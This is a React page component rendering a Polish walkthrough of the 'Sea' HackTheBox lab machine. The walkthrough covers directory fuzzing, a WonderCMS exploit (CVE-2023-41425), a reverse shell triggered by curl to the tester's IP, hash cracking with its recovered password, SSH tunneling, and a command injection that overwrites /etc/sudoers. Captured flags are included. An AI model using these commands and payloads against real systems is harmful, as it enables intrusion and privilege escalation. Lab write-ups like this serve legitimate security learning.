import { Link } from 'react-router-dom';
import see from '../../../assets/see.png';
import see_readme from '../../../assets/see_readme.png';
import see_rev_shell from '../../../assets/see_rev_shell.png';
import see_files_in from '../../../assets/see_files_in.png';
import see_exploit_inside from '../../../assets/see_exploit_inside.png';
import see_password from '../../../assets/see_password.png';
import see_1_flag from '../../../assets/see_1_flag.png';
import see_2_flag from '../../../assets/see_2_flag.png';
import see_linpeas from '../../../assets/see_linpeas.png';
import see_system from '../../../assets/see_system.png';
import see_request from '../../../assets/see_request.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const See = () =>{
    return(
        <section>
            <h1>See</h1>
            <ExampleFrame screen={see} />

            <div className='waring'>
                <p>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://sea.htb/FUZZ</p>
                <br />
                <p>Rezultat: <span className='important'>/theme</span></p>
            </div>
            <div className='waring'>
                <p>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://sea.htb/theme/FUZZ</p>
                <br />
                <p>Rezultat: <span className='important'>/bike</span></p>
            </div>
            <div className='waring'>
                <p>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://sea.htb/theme/bike/FUZZ</p>
                <br />
                <p>Rezultat: <span className='important'>/LICENSE</span> oraz <span className='important'>/README.md</span></p>
            </div>
            <ExampleFrame screen={see_readme} />
            <p>Exploit WonderCMS <span className='important'>CVE-2023–41425</span> <Link to='https://github.com/prodigiousMind/CVE-2023-41425'>Exploit</Link></p>

            <hr />
            <h2>Exploit</h2>

            <div className='waring'>
                <p>nc -lnvp 6969</p>
            </div>
            <div className='waring'>
                <p>python3 exploit.py http://sea.htb/themes 10.10.14.16 6969</p>
            </div>
            <div className='waring'>
                <p></p>
                <p>curl 'http://sea.htb/themes/<span className='important'>revshell-main/rev.php?lhost=10.10.14.16&lport=6969</span>'</p>
            </div>
            <ExampleFrame screen={see_rev_shell} />
            <ExampleFrame screen={see_files_in} />
            <ExampleFrame screen={see_exploit_inside} />
            <ExampleFrame screen={see_password} />

            <div className='waring'>
                <p>hashcat -m 3200 -a 0 hash /usr/share/seclists/rockyou.txt</p>
                <p>Rezultat: <span className='important'>mychemicalromance</span></p>
            </div>

            <div className='waring'>
                <p>ssh amay@bike.htb</p>
                <p>cat user.txt</p>
            </div>
            <ExampleFrame screen={see_1_flag} />
            <div className='waring'>
                <p><span className='important'>3d55ea5d5269546ccaec9d03ab0a45ba</span></p>
            </div>

            <hr />
            <h2>Ponownie włączamy Linpeas</h2>
            <ExampleFrame screen={see_linpeas} />

            <h3>Tunneling</h3>
            <div className='waring'>
                <p>ssh -L 6969:localhost:8080 amay@sea.htb</p>
                <p>http://localhost:6969</p>
            </div>
            <ExampleFrame screen={see_system} />
            <ExampleFrame screen={see_request} />

            <div className='waring'>
                <p>log_file=<span className='important'>/root/root.txt;cp/dev/shm/sudoers{`>`}/etc/sudoers</span>&analyze_log</p>
                <p><span className='important'>ea8bc16098f6873220b2a87494f629ea</span></p>
            </div>
            <ExampleFrame screen={see_2_flag} />

        </section>
    )
}

export default See;